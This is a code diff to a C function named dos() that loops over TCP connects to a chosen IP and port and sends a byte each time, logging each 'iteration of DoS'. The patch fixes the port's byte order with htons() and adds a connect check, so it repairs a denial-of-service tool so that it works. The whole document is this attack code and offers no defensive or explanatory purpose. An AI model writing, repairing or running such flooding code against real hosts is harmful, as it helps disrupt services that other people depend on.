@@ -15,7 +15,7 @@ void dos(const char * ip, int port) {
   addr_len = sizeof(struct sockaddr);
   struct sockaddr_in dest;
   dest.sin_family = AF_INET;
-  dest.sin_port = port;
+  dest.sin_port = htons(port);
   struct hostent *host = (struct hostent *)gethostbyname(ip);
   dest.sin_addr = *((struct in_addr *)host->h_addr);
   printf("Start of the DoS %s:%d\n", ip, port);
@@ -24,7 +24,11 @@ void dos(const char * ip, int port) {
   {
     char petition = 1;
     sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr));
+    if(connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr)))
+    {
+      printf("Cannot connect\n");
+      return;
+    }
     send(sockfd, (char *)&petition, sizeof(petition), 0);
     printf("%d iteration of DoS\n", ++i);
     sleep(0.5);
